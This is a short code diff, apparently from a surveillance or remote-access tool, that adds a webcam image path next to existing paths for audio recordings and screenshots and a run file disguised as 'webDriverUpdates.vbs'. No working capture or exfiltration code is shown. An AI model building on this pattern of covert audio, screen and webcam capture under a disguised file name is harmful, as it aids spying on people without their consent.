@@ -14,3 +14,4 @@ RUN_FILENAME = "webDriverUpdates.vbs"
 
 RECORD_PATH = os.path.join(PC_TEMP_DIR, "sound.wav")
 SCREENSHOT_PATH = os.path.join(PC_TEMP_DIR, "screenshot.jpg")
+WEBCAM_SCREEN_PATH = os.path.join(PC_TEMP_DIR, "webcam.jpg")
